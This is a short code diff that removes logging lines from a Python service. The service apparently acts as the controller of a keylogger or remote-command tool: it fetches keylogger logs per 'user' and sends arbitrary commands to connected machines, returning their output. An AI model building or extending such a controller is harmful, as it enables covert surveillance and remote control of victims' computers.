@@ -19,7 +19,6 @@ class UserService:
     
     def getKeyloggerLogs(self, user_id):
         user = self.user_repository.get_user(user_id)
-        logging.info(user_id)
         if not user:
              return {"error": "User not found"}
         return {
@@ -32,9 +31,7 @@ class UserService:
         if not user:
             return {"error": "User not found"}
         await user.send("print('pause')")
-        logging.info(f"Sent the pause")
         async with user.lock:
-            logging.info("Acquired the lock")
             await user.send(command)
             return {
                 "message": f"> : {(await user.receive()).decode()}"
